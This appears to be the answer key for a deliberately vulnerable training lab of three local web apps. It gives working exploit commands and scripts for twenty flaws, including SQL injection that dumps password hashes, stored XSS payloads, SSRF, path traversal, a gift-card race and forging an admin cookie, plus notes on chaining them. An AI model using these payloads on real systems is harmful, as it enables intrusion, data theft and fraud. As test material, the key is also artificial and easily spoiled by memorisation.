# SOLUTIONS — Demo Web

**Spoilers.** Every finding below was reproduced against the running apps before this file
was written. Twenty findings across three applications.

Setup for all examples:

```bash
cd demo-web && python3 serve.py        # landing :8800, apps :8801-:8803
```

`curl` examples use a cookie jar per app. Python examples assume `requests` is installed.

| App | # | Finding | Severity | Auth |
|-----|---|---------|----------|------|
| Quillworks | 1 | Second-order SQL injection via note tags | Critical | editor |
| Quillworks | 2 | Cross-workspace note revision restore (IDOR) | High | any user |
| Quillworks | 3 | Self-service role escalation to workspace owner | High | member |
| Quillworks | 4 | Stored XSS through sanitise-then-markdown ordering | High | editor |
| Quillworks | 5 | SSRF in the document importer | Medium | member |
| Quillworks | 6 | Open redirect in the login `next` parameter | Low | none |
| Harbor Lane | 7 | Negative cart quantity → negative order total + credit | High | customer |
| Harbor Lane | 8 | Gift-card TOCTOU race → double spend | High | customer |
| Harbor Lane | 9 | Returns API accepts another user's order item (BOLA) | High | customer |
| Harbor Lane | 10 | Predictable order reference → guest order PII | Medium | none |
| Harbor Lane | 11 | Store API key exposed in public JS, customer-export scope | High | none |
| Harbor Lane | 12 | Stored XSS in the merchant review panel (sanitiser bypass) | High | customer |
| Harbor Lane | 13 | SSRF in the merchant webhook tester | Medium | merchant |
| Harbor Lane | 14 | SVG upload → stored XSS on the storefront origin | High | merchant |
| Meridian | 15 | CSV export missing role check → full ticket dump | High | customer |
| Meridian | 16 | SQL injection in the ticket `sort` parameter | Critical | customer |
| Meridian | 17 | Internal notes leaked through the JSON ticket API | High | customer |
| Meridian | 18 | Path traversal in attachment download | High | customer |
| Meridian | 19 | Forgeable remember-me cookie → admin takeover | Critical | none |
| Meridian | 20 | Blind stored XSS via User-Agent in the audit log | High | none |

---

## Quillworks (`http://127.0.0.1:8801`)

### 1. Second-order SQL injection via note tags — Critical

Tags are inserted parameterised, then read back and concatenated into an `IN (...)` list for
the related-notes panel on every note page. The payload is stored once and detonates on view.

```bash
curl -s -c qw.jar -d 'email=demo@quillworks.test&password=demo1234' http://127.0.0.1:8801/login

curl -s -b qw.jar -c qw.jar \
  --data-urlencode 'title=Related reading' \
  --data-urlencode 'body=Nothing to see here.' \
  --data-urlencode "tags=zz') UNION SELECT 1,email||':'||password_hash,'sandbox' FROM users--" \
  http://127.0.0.1:8801/w/sandbox/new -L
```

The new note page's **Related notes** panel lists one row per user, with
`email:scrypt-hash` as the title. (`/w/sandbox/n/<id>` is in the redirect URL.)

Root cause: `related_notes()` builds `"'" + tag + "'"` per stored tag instead of binding the
list. Newlines are the tag separator, which is what preserves the commas in the payload.

### 2. Cross-workspace revision restore — High

The restore endpoint checks that you can see the *note*, but not that the *version* belongs
to it. Version ids are global and sequential, so any revision from any workspace can be
restored into a note you control.

```bash
# as demo, create a note in your own workspace and keep its id
curl -s -b qw.jar -c qw.jar -d 'title=Scratch&body=empty' http://127.0.0.1:8801/w/sandbox/new -L
# note id is in the final URL

# mira's private memo is note 8; its final revision is version 9
curl -s -b qw.jar -X POST http://127.0.0.1:8801/api/notes/<your_note_id>/versions/9/restore
```

Open your note: the title and body are now **“Q3 pricing memo”** including
“Margin target: 78% blended by Q4” — content from a workspace you cannot access. Enumerate
version ids 1..N; 404 means no such revision, 200 means stolen.

### 3. Role escalation to workspace owner — High

`PATCH /api/workspaces/<wid>/members/<uid>` allows self-edits without an admin check (the
"members can manage their own profile" carve-out), and the JSON body is applied to the
membership row — including `role`.

demo is user 2 and an `editor` in workspace 1 (Atlas Handbook):

```bash
curl -s -b qw.jar -X PATCH -H 'Content-Type: application/json' \
  -d '{"role":"owner"}' http://127.0.0.1:8801/api/workspaces/1/members/2
# {"ok":true,"role":"owner"}

curl -s -b qw.jar http://127.0.0.1:8801/w/atlas/settings | grep -o 'Danger zone'
```

Owner unlocks settings, billing and workspace deletion; the members table then lets you
demote the real owner.

### 4. Stored XSS in comments — High

Comments are tag-stripped on **input**; markdown is rendered on **display**. The renderer
puts the image URL into `src="..."` without escaping, so a quote in the URL breaks out into
an event handler. Because sanitising already happened, `onerror` was never seen.

```bash
NOTE=<note id in a workspace you can write to>
curl -s -b qw.jar --data-urlencode 'body=![a](x" onerror="alert&#40;document.domain&#41;")' \
  http://127.0.0.1:8801/w/sandbox/n/$NOTE/comment
```

The stored HTML is `<img src="x" onerror="alert&#40;document.domain&#41;"...>`; the browser
decodes the entities and executes. Load the note as any workspace member (the seeded
`mira` account works) and the alert fires. Session cookies are not `HttpOnly` in this app.

### 5. SSRF in the document importer — Medium

`POST /w/<slug>/import` fetches a user-supplied URL server-side with no scheme/host
restriction, then shows the first 20 KB in a preview textarea.

```bash
curl -s -b qw.jar --data-urlencode 'url=http://127.0.0.1:8802/api/v1/products' \
  http://127.0.0.1:8801/w/sandbox/import | grep -o '"sku": "[^"]*"' | head
```

Reaches loopback services that are not exposed to the browser. In a cloud deployment the
same primitive reaches `169.254.169.254`.

### 6. Open redirect — Low

`next` is validated with `startswith("/")`, which accepts protocol-relative URLs.

```bash
curl -si -d 'email=demo@quillworks.test&password=demo1234&next=//evil.example/x' \
  http://127.0.0.1:8801/login | grep -i '^location'
# Location: //evil.example/x
```

Useful for phishing and for chaining with OAuth-style flows.

---

## Harbor Lane (`http://127.0.0.1:8802`)

Session setup:

```bash
curl -s -c hl.jar -d 'email=demo@harborlane.test&password=demo1234' http://127.0.0.1:8802/login
```

### 7. Negative cart quantity — High

The HTML form clamps quantity to 1–99, but the JSON cart endpoint does not validate at all.
Line totals and the order total are signed; a negative total is treated as an overpayment
and credited back to the account.

```bash
curl -s -b hl.jar -c hl.jar -H 'Content-Type: application/json' \
  -d '{"sku":"HL-TNT-2P","qty":-2}' http://127.0.0.1:8802/api/v1/cart/items

curl -s -b hl.jar -c hl.jar -d 'email=demo@harborlane.test&ship_name=Alex&address=1+Test+Lane' \
  -D - http://127.0.0.1:8802/checkout | grep -i location
# Location: /order/HL-00002-...

curl -s -b hl.jar http://127.0.0.1:8802/order/HL-00002-... | grep -A1 'Total'
# Total  $-658.00
```

Account page (`/account`) now shows **$658.00** store credit. Repeat with larger quantities.
The cart cookie is also unsigned base64 JSON if you prefer to skip the API.

### 8. Gift-card race — High

`_apply_gift()` reads the balance, sleeps while "the payment provider responds", then
debits. Two checkouts in that window both see the full balance.

```python
import requests, threading
B = "http://127.0.0.1:8802"
s = requests.Session()
s.post(B + "/login", data={"email": "demo@harborlane.test", "password": "demo1234"})
s.post(B + "/api/v1/cart/items", json={"sku": "HL-BAG-15", "qty": 2})   # $498
cookies = s.cookies.get_dict()

def checkout():
    ss = requests.Session(); ss.cookies.update(cookies)
    ss.post(B + "/checkout", data={"email": "demo@harborlane.test", "ship_name": "Alex",
                                   "address": "1 Test Lane", "gift_card": "HL-GIFT-200"})

threads = [threading.Thread(target=checkout) for _ in range(2)]
[t.start() for t in threads]; [t.join() for t in threads]
print(requests.get(B + "/gift/HL-GIFT-200").text)   # balance is now -$200.00
```

Each order gets the full $200 discount; the card goes negative. The same window exists on
any endpoint that reserves a balance before committing it.

### 9. Returns BOLA — High

`POST /api/v1/returns` looks up the order item, then credits the **caller** without checking
that the order belongs to them. Order 1 belongs to mira; item 1 is her $329 tent.

```bash
curl -s -b hl.jar -H 'Content-Type: application/json' \
  -d '{"order_item_id":1,"reason":"damaged in transit"}' http://127.0.0.1:8802/api/v1/returns
# {"ok":true,"refund_cents":32900,"credited_to":"demo@harborlane.test",...}
```

`/account` shows the credit. Enumerate `order_item_id` (1..N) for free money against every
customer's orders. Refunds are auto-approved.

### 10. Predictable order reference — Medium

Guest order pages (`/order/<ref>`) need no authentication. The reference looks opaque but is
derived from the auto-increment id: `HL-%05d-%03d` with the suffix `(id*37 + 11) % 1000`.

```bash
# order 1 belongs to mira
curl -s http://127.0.0.1:8802/order/HL-00001-048 | grep -E 'mira|Quayside'
```

Enumerate ids 1..N, compute the suffix, and read every customer's name, email, shipping
address and basket. No account required.

### 11. Store API key leaked in public JavaScript — High

`GET /static/js/storefront.js` contains:

```js
const HARBOR_DEMO_KEY = "hl_live_7c41d9e2b8a640f5c3d1e0a9b7f2c4d8";
```

The same key is accepted by the customer export endpoint, which is not used by the public
playground (the playground only calls `/api/v1/products`).

```bash
curl -s 'http://127.0.0.1:8802/api/v1/customers/export?key=hl_live_7c41d9e2b8a640f5c3d1e0a9b7f2c4d8'
```

Returns a CSV of every order: reference, date, customer name, email, full shipping address,
total and status. The key is scoped to the store but is not least-privilege — read-only
catalogue access does not need PII export.

### 12. Stored XSS in the merchant review panel — High

Reviews are filtered on write with a blocklist (`<script>` blocks and `on\w+=`). An iframe
`srcdoc` carrying **entity-encoded** script survives the filter. The merchant dashboard
renders review bodies with `|safe`, so the payload executes for staff.

```bash
curl -s -b hl.jar --data-urlencode 'rating=5' --data-urlencode 'title=Great tent' \
  --data-urlencode 'body=<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">' \
  http://127.0.0.1:8802/product/ridgeline-2p-tent/review
```

Then sign in to the merchant portal (`mira@harborlane.test` / `mira1234`) and open
`/merchant/reviews`. The iframe decodes its `srcdoc` and runs `alert(document.domain)` in the
store origin — the panel has no CSP, so a real payload can read the merchant session or call
the store API as staff.

### 13. SSRF in the webhook tester — Medium

`POST /api/v1/webhooks/test` accepts any URL and returns the response body.

```bash
curl -s -X POST \
  'http://127.0.0.1:8802/api/v1/webhooks/test?key=hl_live_7c41d9e2b8a640f5c3d1e0a9b7f2c4d8' \
  -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:8801/login"}'
```

A 200 with the Quillworks sign-in page in `response` proves server-side fetch of an internal
service. Point it at metadata endpoints or admin APIs in a real deployment.

### 14. SVG upload → stored XSS on the storefront origin — High

Product images accept `.svg` and are served by `send_from_directory` without
`Content-Disposition: attachment` or `X-Content-Type-Options`. An SVG with an `onload`
handler executes when opened directly on the store's origin.

Merchant portal → **Products → Add a product**, upload:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="200" height="120" fill="#e8a33d"/>
</svg>
```

Then open the returned `/uploads/<name>.svg`. Verified: `Content-Type: image/svg+xml` and the
alert fires. Any user can open the store (`/merchant/apply` creates a store instantly), so
this needs no privileged account. A crafted link to the upload URL is same-origin XSS against
customers.

---

## Meridian Support (`http://127.0.0.1:8803`)

Customer session:

```bash
curl -s -c mer.jar -d 'email=demo@meridian.test&password=demo1234' http://127.0.0.1:8803/login
```

### 15. CSV export missing the role check — High

`/admin/export/tickets.csv` is protected by `@login_required` only. It is linked from the
admin overview and tickets pages, but nothing stops a customer from requesting it.

```bash
curl -s -b mer.jar http://127.0.0.1:8803/admin/export/tickets.csv
```

The CSV contains every ticket in the workspace, requester names and emails, assignees, and
the concatenated **internal notes** — including the note on ticket 1 about the Stripe refund
escalation. A customer can exfiltrate the whole support backlog with one request.

### 16. SQL injection in `sort` — Critical

`/api/tickets?sort=field.direction` splits on the first dot, checks the **field** against an
allow-list, and interpolates the direction raw:

```python
field, _, direction = sort.partition(".")
if field not in SORTABLE: abort(400)
sql = "... ORDER BY " + field + " " + direction
```

Because SQLite evaluates the CASE for every row, an error works as a boolean oracle:

```python
import requests
B = "http://127.0.0.1:8803"
s = requests.Session()
s.post(B + "/login", data={"email": "demo@meridian.test", "password": "demo1234"})

def oracle(cond):
    payload = ("id.desc, CASE WHEN (%s) THEN abs(-9223372036854775808) ELSE 0 END" % cond)
    return s.get(B + "/api/tickets", params={"sort": payload}).status_code == 200

print(oracle("(SELECT substr(password_hash,1,1) FROM users WHERE id=1)='s'"))  # False -> 500
print(oracle("(SELECT substr(password_hash,1,1) FROM users WHERE id=1)='z'"))  # True  -> 200
```

Extract the admin hash (user id 1), the export key, anything. The same query can be used
with `LIKE`/`substr` for a full blind dump. `SORTABLE` blocks only the prefix, not the rest
of the expression.

### 17. Internal notes leaked by the JSON API — High

The HTML ticket view filters `is_internal` messages for customers. The API serializer does
not.

```bash
curl -s -b mer.jar http://127.0.0.1:8803/api/tickets/1 | python3 -m json.tool | grep -A2 internal
```

Returns `"is_internal": true` and the note body: “Stripe refund was issued but the customer's
bank shows no record. Escalating to finance.” Any customer can read the internal thread on
their own tickets, and ticket ids are sequential.

### 18. Path traversal in attachment download — High

The download route accepts the display filename from the URL and joins it to the upload
directory. The ownership check uses the attachment row, but the path is the user-controlled
segment.

```bash
# 1. create a ticket and attach any file (gives you a valid attachment id)
curl -s -b mer.jar -c mer.jar -d 'subject=Proof&body=see attached&priority=low' \
  http://127.0.0.1:8803/tickets/new -L
curl -s -b mer.jar -F 'file=@/etc/hostname;filename=proof.txt' \
  http://127.0.0.1:8803/tickets/<ticket_id>/attachments

# 2. escape the upload directory (attachment id from the ticket page)
curl -s -b mer.jar 'http://127.0.0.1:8803/attachments/1/..%2Fapp.py' | head -20
```

Returns the Flask source, including the session secret. Use `..%2F..%2Finstance%2Fmeridian.db`
to pull the database, or target `/etc/passwd` from the app directory.

### 19. Forgeable remember-me cookie — Critical

On login with “remember this device”, the app sets
`meridian_remember = base64("<uid>:<md5(uid)>")`. There is no HMAC, no server-side store and
no expiry validation beyond the cookie's own `Max-Age`.

```bash
python3 - <<'EOF'
import base64, hashlib
uid = 1                                   # sofia@meridian.test, seeded admin
print(base64.urlsafe_b64encode(f"{uid}:{hashlib.md5(str(uid).encode()).hexdigest()}".encode()).decode())
EOF

curl -s -b 'meridian_remember=<value>' http://127.0.0.1:8803/admin/ | grep -o 'Overview'
```

The middleware trusts the cookie and logs you in as user 1. No password, no session token
from the server. Rotate `userId` to impersonate any agent or customer.

### 20. Blind stored XSS via User-Agent — High

Every login attempt is written to the audit table with the raw `User-Agent`. The admin audit
page builds its table as a `Markup` string for speed, so the UA is not escaped.

```bash
curl -s -A '<img src=x onerror="alert(document.domain)">' \
  -d 'email=anything@example.test&password=wrong' http://127.0.0.1:8803/login
```

Sign in as the admin (`sofia@meridian.test` / `sofia1234`) and open `/admin/audit`. The
payload executes in the admin origin. A real payload would read the CSRF-less admin
endpoints, add an admin user, or exfiltrate the audit and ticket data. The attack needs no
account and leaves a row behind on every visit.

---

## Chaining notes

- Quillworks #1 (SQLi) dumps password hashes; #3 turns any member into an owner; #2 reads
  private workspaces. Together: full tenant compromise from a free editor account.
- Harbor Lane #11 exports customer PII; #10 gives order references; #12 targets staff. The
  store-owner session obtained via #14 (any user can open a store) can read #11's key from
  the settings page, closing the loop.
- Meridian #20 runs in the admin panel; #19 is a direct admin session; #16 dumps the admin
  hash needed if you prefer to log in properly; #18 reads the signing secret from disk.
